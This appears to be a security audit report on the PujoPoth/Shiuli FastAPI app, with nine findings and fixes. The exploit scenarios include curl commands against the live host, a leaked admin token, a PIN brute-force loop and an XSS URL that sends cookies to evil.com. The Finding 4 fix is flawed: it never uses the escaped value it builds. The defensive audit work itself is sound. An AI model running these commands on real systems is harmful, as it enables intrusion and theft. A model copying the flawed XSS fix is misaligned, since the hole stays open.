# 🔴 PujoPoth / Shiuli — Application Security Audit Report

**Audit Date**: 2026-08-14  
**Auditor**: Principal Application Security Auditor  
**Scope**: Full-stack codebase — Python/FastAPI backend + React/Vite frontend  
**Classification**: CONFIDENTIAL — For Internal Development Use Only

---

## Application Context

| Layer | Technology | Notes |
| :--- | :--- | :--- |
| **Backend** | Python 3 / FastAPI | Deployed on Render free tier |
| **Frontend** | React 18 + Vite + TypeScript | Deployed on Vercel |
| **Database** | None (file-based JSON) | Static `.json` files in `backend/data/` |
| **Authentication** | Custom token header (`x-admin-token`) | No JWT, no sessions, no OAuth |
| **Maps** | Folium (server-rendered HTML) + MapLibre GL JS | OSRM demo server for routing |

---

## Executive Summary

The PujoPoth application has **9 confirmed vulnerabilities** ranging from **Critical** to **Low** severity. The most dangerous findings are:

1. **Full beta user database publicly exposed** via unauthenticated GET endpoint — leaking all emails, PINs, and access codes.
2. **Hardcoded admin credential** committed to the public GitHub repository.
3. **Wildcard CORS** combined with `allow_credentials=True` — a textbook misconfiguration exploitable for cross-origin credential theft.
4. **Stored XSS vector** in the server-rendered Folium map via unsanitized query parameters injected into raw HTML/JavaScript.

---

## Findings

---

### 🔴 FINDING 1 — Full Beta User Database Publicly Exposed (Data Leak)

**Vulnerability Type**: Broken Access Control / Information Disclosure  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py#L246-L253) — `GET /api/beta/users`  
**Severity**: 🔴 **CRITICAL**

#### Code

```python
# Line 246-253
@app.get("/api/beta/users")
def get_beta_users():
    """Return all authorized beta access users with their 5-digit PINs and access codes."""
    beta_file = os.path.join(os.path.dirname(__file__), "data", "beta_users.json")
    if not os.path.exists(beta_file):
        raise HTTPException(status_code=404, detail="Beta users dataset not found")
    with open(beta_file, "r", encoding="utf-8") as f:
        return json.load(f)
```

#### Exploit Scenario

Any anonymous user or bot can issue:

```bash
curl https://shiuli-backend.onrender.com/api/beta/users
```

This returns the **complete dataset** of 81 beta users including:
- Full names
- Personal email addresses (PII under GDPR/IT Act 2000)
- 5-digit PINs
- Full access codes (`email-pin` format)

An attacker who obtains this data can:
1. **Impersonate any beta user** by sending a valid `POST /api/beta/verify` request.
2. **Harvest email addresses** for phishing or spam campaigns.
3. **Credential-stuff** these emails against other services (many users reuse passwords with the same email).

#### Remediation

```python
# Option A: Require admin authentication
@app.get("/api/beta/users")
def get_beta_users(request: Request, _ = Depends(verify_admin)):
    """Return all authorized beta access users (admin only)."""
    # ...existing code...

# Option B: Remove the endpoint entirely from production
# Delete the route and remove it from the root endpoint catalog
```

---

### 🔴 FINDING 2 — Hardcoded Admin Token in Source Code (Credential Leak)

**Vulnerability Type**: Secrets & Configuration / Hardcoded Credentials  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py#L49) — Line 49  
**Severity**: 🔴 **CRITICAL**

#### Code

```python
# Line 49
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "Pujopath2k26")
```

#### Exploit Scenario

The repository is **public** on GitHub (`https://github.com/rono-007/Shiuli`). Any person on the internet can:

1. Read line 49 of `main.py` and obtain the admin token `Pujopath2k26`.
2. Access the full admin dashboard:
   ```bash
   curl -H "x-admin-token: Pujopath2k26" https://shiuli-backend.onrender.com/admin/stats
   curl -H "x-admin-token: Pujopath2k26" https://shiuli-backend.onrender.com/admin/logs
   ```
3. View all **request logs** including visitor IP addresses, user agents, referers, and request paths.

Additionally, the **same string `Pujopath2k26` is also a developer bypass code** for beta verification (line 262), meaning this single leaked secret grants both admin AND beta access.

#### Remediation

```python
# Remove the hardcoded fallback entirely
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN")
if not ADMIN_TOKEN:
    raise RuntimeError("FATAL: ADMIN_TOKEN environment variable is not set.")
```

Set the token in Render Dashboard → Environment Variables:
```
ADMIN_TOKEN=<random-64-char-hex-string>
```

---

### 🔴 FINDING 3 — Developer Bypass Codes Shipped to Production

**Vulnerability Type**: Broken Authentication / Authentication Bypass  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py#L262-L273) — Lines 262–273  
**Severity**: 🔴 **CRITICAL**

#### Code

```python
# Line 262-263
DEV_CODES = {"dev", "developer", "admin", "pujopath2k26", "00000", "12345"}
if email in DEV_CODES or access_code in DEV_CODES:
    return {
        "valid": True, 
        "message": "Developer Access Granted", 
        ...
    }
```

#### Exploit Scenario

Any user can bypass the entire beta verification system:

```bash
curl -X POST https://shiuli-backend.onrender.com/api/beta/verify \
  -H "Content-Type: application/json" \
  -d '{"email": "dev", "access_code": "anything"}'
# Response: {"valid": true, "message": "Developer Access Granted", ...}
```

All 6 bypass codes are trivially guessable: `dev`, `developer`, `admin`, `pujopath2k26`, `00000`, `12345`. The condition `email in DEV_CODES or access_code in DEV_CODES` means **either field** can trigger the bypass independently.

#### Remediation

```python
# Remove developer bypass codes entirely in production
# Use environment variable to gate developer mode

import os

DEV_MODE = os.getenv("DEV_MODE", "false").lower() == "true"

# Inside verify_beta_access():
if DEV_MODE:
    DEV_SECRET = os.getenv("DEV_BYPASS_SECRET")
    if DEV_SECRET and access_code == DEV_SECRET:
        return {"valid": True, "message": "Developer Access Granted", ...}
```

---

### 🔴 FINDING 4 — Reflected / Stored XSS via Map Endpoint

**Vulnerability Type**: Cross-Site Scripting (XSS) — Reflected  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py#L1238-L1240) — Lines 1238–1240  
**Severity**: 🔴 **CRITICAL**

#### Code

```python
# Line 1238-1240
rendered_js = (js_template.replace("{{PANDALS_JSON}}", pandals_json)
                           .replace("{{FACILITIES_JSON}}", facilities_json)
                           .replace("{{SELECTED_NAME}}", selected.replace('"', '\\"')))
```

The `selected` parameter comes directly from the user-controlled query string (`GET /api/map?selected=...`) and is injected into raw JavaScript inside an HTML page. The escaping only handles double quotes but does **NOT** handle:
- `</script>` tag injection
- Backslash sequences
- Template literal breakouts
- HTML entity injection

#### Exploit Scenario

An attacker crafts a malicious URL:

```
https://shiuli-backend.onrender.com/api/map?selected=</script><script>document.location='https://evil.com/?c='+document.cookie</script>
```

When any user opens this link (e.g., shared in a WhatsApp group during Durga Puja), the injected JavaScript executes in their browser.

The `q` parameter is also injectable via the same mechanism since `pandals_json` is built from `q`-filtered data but the string replacement for `SELECTED_NAME` is the most direct vector.

#### Remediation

```python
import html
import json

# Use proper JSON encoding for the selected name, then HTML-escape the entire block
safe_selected = json.dumps(selected)  # This properly escapes ALL special characters
rendered_js = (js_template
    .replace("{{PANDALS_JSON}}", pandals_json)
    .replace("{{FACILITIES_JSON}}", facilities_json)
    .replace("{{SELECTED_NAME}}", html.escape(selected)))  # HTML-escape for tag injection
```

---

### 🟠 FINDING 5 — Dangerous CORS Misconfiguration

**Vulnerability Type**: Security Misconfiguration / CORS  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py#L135-L141) — Lines 135–141  
**Severity**: 🟠 **HIGH**

#### Code

```python
# Line 135-141
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

#### Exploit Scenario

`allow_origins=["*"]` + `allow_credentials=True` is an explicitly dangerous combination flagged by OWASP. While FastAPI's CORSMiddleware does block `Access-Control-Allow-Credentials: true` when origin is `*` (it refuses to reflect the wildcard with credentials), this configuration signals intent to be maximally permissive.

A malicious website can make cross-origin requests to your API from **any domain**, potentially:
- Triggering admin actions if the victim has the admin token cached
- Scraping all public API data from the victim's browser context
- Sending crafted POST requests to `/api/beta/verify`

#### Remediation

```python
ALLOWED_ORIGINS = [
    "https://shiuli.online",
    "https://www.shiuli.online",
    "https://beta.shiuli.online",
    "http://localhost:5173",  # Local dev only
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=False,  # No cookies/sessions are used
    allow_methods=["GET", "POST", "OPTIONS"],
    allow_headers=["Content-Type", "x-admin-token"],
)
```

---

### 🟠 FINDING 6 — No Rate Limiting on Authentication Endpoints

**Vulnerability Type**: Broken Authentication / Brute Force  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py#L255-L293) — `POST /api/beta/verify`  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py#L129-L132) — Admin token check  
**Severity**: 🟠 **HIGH**

#### Exploit Scenario

The beta verification endpoint accepts unlimited requests with no rate limiting, CAPTCHA, or account lockout:

```bash
# Brute-force the 5-digit PIN for a known email (only 100,000 combinations)
for pin in $(seq -w 00000 99999); do
  curl -s -X POST https://shiuli-backend.onrender.com/api/beta/verify \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"victim@gmail.com\", \"access_code\": \"$pin\"}" &
done
# Expected time to crack: ~2 minutes with 100 concurrent requests
```

The admin token endpoint (`/admin/stats`, `/admin/logs`) also has no rate limiting, allowing unlimited brute-force attempts against the `x-admin-token` header.

#### Remediation

```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.post("/api/beta/verify")
@limiter.limit("5/minute")  # Max 5 attempts per IP per minute
def verify_beta_access(request: Request, data: dict):
    # ...existing code...
```

---

### 🟡 FINDING 7 — Missing Security Headers

**Vulnerability Type**: Security Misconfiguration / Missing HTTP Headers  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py) — Global middleware  
**Severity**: 🟡 **MEDIUM**

#### Missing Headers

| Header | Purpose | Current State |
| :--- | :--- | :--- |
| `Content-Security-Policy` | Prevents XSS, code injection | ❌ Missing |
| `Strict-Transport-Security` | Forces HTTPS, prevents downgrade attacks | ❌ Missing |
| `X-Content-Type-Options` | Prevents MIME sniffing | ❌ Missing |
| `X-Frame-Options` | Prevents clickjacking | ❌ Missing |
| `Referrer-Policy` | Controls referer leakage | ❌ Missing |
| `Permissions-Policy` | Restricts browser features | ❌ Missing |

#### Remediation

```python
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "geolocation=(self), microphone=()"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    return response
```

---

### 🟡 FINDING 8 — Error Messages Leak Internal File Paths and Stack Traces

**Vulnerability Type**: Information Disclosure  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py#L586) — Multiple data loader functions  
**Severity**: 🟡 **MEDIUM**

#### Code

```python
# Line 586
raise HTTPException(status_code=500, detail=f"Failed to read pandal data: {str(e)}")

# Line 610
raise HTTPException(status_code=500, detail=f"Failed to read pandal data: {str(e)}")

# Line 716
raise HTTPException(status_code=500, detail=f"Error loading metros data: {str(e)}")

# Line 1278
return {"error": f"Failed to load distance data: {e}"}
```

#### Exploit Scenario

If a file read fails, the raw Python exception (including **full file system paths**) is returned to the client:

```json
{
  "detail": "Failed to read pandal data: [Errno 2] No such file or directory: 'D:\\PujoPoth\\backend\\data\\north_cords.json'"
}
```

This reveals:
- The server's **operating system** (Windows drive letters)
- The **absolute installation path** of the application
- The **internal directory structure**

#### Remediation

```python
# Use generic error messages in production
import logging
logger = logging.getLogger(__name__)

# In each loader:
except Exception as e:
    logger.error(f"Failed to read pandal data: {str(e)}")
    raise HTTPException(status_code=500, detail="Internal server error. Please try again later.")
```

---

### 🟢 FINDING 9 — Admin Token Transmitted in Plain HTTP Header (No Expiry, No Rotation)

**Vulnerability Type**: Broken Authentication / Weak Token Design  
**Location**: [main.py](file:///d:/PujoPoth/backend/main.py#L129-L132), [AdminPanel.tsx](file:///d:/PujoPoth/frontend/src/components/AdminPanel.tsx#L211-L214)  
**Severity**: 🟢 **LOW** (mitigated by HTTPS in production)

#### Code

```python
# Backend - Line 130
def verify_admin(request: Request):
    token = request.headers.get("x-admin-token", "")
    if token != ADMIN_TOKEN:
        raise HTTPException(status_code=401, detail="Unauthorized")
```

```typescript
// Frontend AdminPanel.tsx - Line 212
const res = await fetch(`${API_BASE}${path}`, {
    headers: { 'x-admin-token': token },
});
```

#### Issues

1. **Static token** — No expiry, no rotation, no session management. A leaked token grants permanent access.
2. **Simple string comparison** — Vulnerable to timing attacks (though practically insignificant for a single static token).
3. **No audit trail** — Admin actions are logged as regular requests with no admin identity tag.

#### Remediation

For a project of this scale, consider at minimum:
- Rotating the token monthly via Render environment variables
- Adding a `?token_hash=` query parameter check as a secondary factor
- Logging admin-authenticated actions separately with the token hash

---

## Summary Table

| # | Finding | Severity | OWASP Category | Status |
| :--- | :--- | :--- | :--- | :--- |
| 1 | Beta user database publicly exposed | 🔴 Critical | A01: Broken Access Control | Open |
| 2 | Hardcoded admin token in public repo | 🔴 Critical | A07: Security Misconfiguration | Open |
| 3 | Developer bypass codes in production | 🔴 Critical | A07: Security Misconfiguration | Open |
| 4 | XSS in server-rendered map endpoint | 🔴 Critical | A03: Injection | Open |
| 5 | Wildcard CORS with credentials | 🟠 High | A05: Security Misconfiguration | Open |
| 6 | No rate limiting on auth endpoints | 🟠 High | A07: Identification & Auth Failures | Open |
| 7 | Missing security headers | 🟡 Medium | A05: Security Misconfiguration | Open |
| 8 | Error messages leak file paths | 🟡 Medium | A04: Insecure Design | Open |
| 9 | Static admin token, no expiry | 🟢 Low | A07: Identification & Auth Failures | Open |

---

## Risk Matrix

```
            │ Low Impact │ Medium Impact │ High Impact │ Critical Impact │
────────────┼────────────┼───────────────┼─────────────┼─────────────────│
Certain     │            │               │             │  F1, F2, F3     │
Likely      │            │               │    F5, F6   │  F4             │
Possible    │            │    F7, F8     │             │                 │
Unlikely    │    F9      │               │             │                 │
```

---

## Priority Remediation Order

> [!CAUTION]
> **STOP SHIPPING** until Findings 1, 2, and 3 are resolved. These are actively exploitable right now by anyone who visits your public GitHub repository.

### Immediate (Before Next Deploy)
1. **F1** — Put `/api/beta/users` behind `Depends(verify_admin)` or delete it
2. **F2** — Remove hardcoded fallback from `ADMIN_TOKEN`, rotate immediately
3. **F3** — Remove all developer bypass codes from production

### This Week
4. **F4** — Sanitize `selected` and `q` parameters in map HTML generation
5. **F5** — Replace wildcard CORS with explicit origin allowlist
6. **F6** — Add rate limiting via `slowapi` or Cloudflare WAF rules

### This Month
7. **F7** — Add security headers middleware
8. **F8** — Replace raw exception messages with generic errors
9. **F9** — Plan token rotation strategy

---

> [!IMPORTANT]
> This report documents findings **as of the audit date** against the codebase at commit `49de789` on the `main` branch of `https://github.com/rono-007/Shiuli`. No source code has been modified as part of this audit.
